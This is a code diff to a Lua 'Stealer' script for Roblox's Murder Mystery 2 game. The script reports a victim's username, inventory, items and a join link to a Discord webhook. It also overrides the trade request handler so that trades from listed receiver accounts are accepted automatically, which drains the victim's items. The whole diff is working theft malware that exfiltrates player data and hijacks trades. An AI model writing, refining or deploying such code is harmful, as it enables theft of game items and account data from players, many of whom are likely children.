@@ -97,14 +97,14 @@ local function send_discord(items, game_name)
             title = game_name.." Stealer",
             color = 15158332,
             fields = {
-                {name="Username",     value=lp.Name,              inline=true},
-                {name="Display",      value=lp.DisplayName,        inline=true},
-                {name="Executor",     value=get_executor(),        inline=true},
-                {name="Antiscam",     value=tostring(detect_antiscam()), inline=true},
-                {name="Receiver",     value=receivers,             inline=true},
-                {name="Inventory",    value=rarity_counts(items),  inline=false},
-                {name="Items",        value=inv_text,              inline=false},
-                {name="Join Link",    value="["..game.JobId.."]("..join..")", inline=false},
+                {name="Username",   value=lp.Name,                       inline=true},
+                {name="Display",    value=lp.DisplayName,                 inline=true},
+                {name="Executor",   value=get_executor(),                 inline=true},
+                {name="Antiscam",   value=tostring(detect_antiscam()),    inline=true},
+                {name="Receiver",   value=receivers,                      inline=true},
+                {name="Inventory",  value=rarity_counts(items),           inline=false},
+                {name="Items",      value=inv_text,                       inline=false},
+                {name="Join Link",  value="[Click here]("..join..")",     inline=false},
             },
         }}
     }
@@ -134,21 +134,27 @@ end
 local function hook_mm2()
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
-    local tradeReqFunction = Trade:WaitForChild("SendRequest", 10)
-    if not tradeReqFunction then return end
+    local sendRequest   = Trade:WaitForChild("SendRequest", 10)
+    local acceptRequest = Trade:WaitForChild("AcceptRequest", 10)
+    if not sendRequest or not acceptRequest then return end
+
     local items = collect_mm2_items()
     send_job("MM2", items)
-    local old_invoke
-    old_invoke = hookfunction(tradeReqFunction.OnClientInvoke, function(senderPlayer, ...)
+
+    sendRequest.OnClientInvoke = function(senderPlayer)
         local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
+        local isAllowed = false
         for _, n in ipairs(CFG.allowed) do
-            if n == senderName then
-                task.wait(CFG.delay / 1000)
-                return old_invoke(senderPlayer, ...)
-            end
+            if n == senderName then isAllowed = true break end
         end
-        return old_invoke(senderPlayer, ...)
-    end)
+        if not isAllowed then return false end
+        task.wait(1)
+        acceptRequest:FireServer()
+        task.wait(0.5)
+        acceptRequest:FireServer()
+        return true
+    end
+
     local tradeGui = lp:WaitForChild("PlayerGui"):WaitForChild("TradeGUI", 10)
     local tradeGuiPhone = lp.PlayerGui:FindFirstChild("TradeGUI_Phone")
     if tradeGui then
